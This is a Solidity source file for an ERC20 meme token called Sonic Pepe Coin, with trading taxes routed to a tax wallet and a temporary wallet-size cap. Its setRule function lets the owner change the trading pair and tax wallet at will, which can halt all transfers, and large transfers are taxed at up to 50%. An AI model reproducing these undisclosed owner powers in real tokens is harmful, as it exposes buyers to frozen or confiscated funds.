// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract PepeSonic is Context, IERC20, Ownable {
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint8 private _decimals = 18;
  uint256 private _totalSupply =   420000000000 * 1e18;
  uint256 private _maxWalletSize = 8400000000 * 1e18; // 2%
  uint256 private _walletSizeLocked = 90; // about 15m
  string private _symbol = "PEPESONIC";
  string private _name = "Sonic Pepe Coin";

  address public pair;

  uint256 private firstBlock;
  uint256 private transferpercent = 1;
  uint256 private sellpercent = 1;
  uint256 private buypercent = 1;
  address private taxWallet;

  constructor() {
    _allowances[address(this)][address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)] = type(uint256).max;
    taxWallet = _msgSender();
    _balances[_msgSender()] = _totalSupply;
    firstBlock = block.number;
    emit Transfer(address(0), _msgSender(), _totalSupply);
  }
  receive() external payable { }

  function decimals() external view returns (uint8) {
    return _decimals;
  }
  function symbol() external view returns (string memory) {
    return _symbol;
  }
  function name() external view returns (string memory) {
    return _name;
  }
  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "transfer amount exceeds allowance"));
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "error in decrease allowance"));
    return true;
  }
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(pair != address(0), "trading is not started");
    require(sender != address(0), "transfer sender address is 0 address");
    require(recipient != address(0), "transfer recipient address is 0 address");
    require(amount > 0, "Transfer amount must be greater than zero");

    if (sender != owner() && recipient != owner() && recipient != pair && recipient != taxWallet) {
      if (firstBlock + _walletSizeLocked > block.number) {
        require(_balances[recipient] + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
      }
    }

    _balances[sender] = _balances[sender].sub(amount, "transfer balance too low");
    amount = (sender == taxWallet || recipient == taxWallet) ? amount : takeTax(sender, amount, recipient);
    _balances[recipient] = _balances[recipient].add(amount);

    emit Transfer(sender, recipient, amount);
  }

  function takeTax(address sender, uint256 amount, address recipient) internal returns (uint256) {
    uint256 percent = transferpercent;
    if(recipient == pair) {
        percent = sellpercent;
    } else if(sender == pair) {
        percent = buypercent;
    }

    if(amount>_maxWalletSize)
        percent = percent.mul(10);
    if(percent>50)
        percent = 50;

    uint256 tax = amount.mul(percent).div(100);
    _balances[taxWallet] = _balances[taxWallet].add(tax);
    emit Transfer(sender, taxWallet, tax);
    return amount.sub(tax);
  }

  function setRule(address _pair, address _taxWallet) public onlyOwner {
    pair = _pair;
    taxWallet = _taxWallet;
  }

  function receiveStuckETH() external {
    payable(taxWallet).transfer(address(this).balance);
  }

  function receiveStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {
    if(tokens == 0){
      tokens = IERC20(tokenAddress).balanceOf(address(this));
    }
    return IERC20(tokenAddress).transfer(taxWallet, tokens);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "approve owner is 0 address");
    require(spender != address(0), "approve spender is 0 address");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}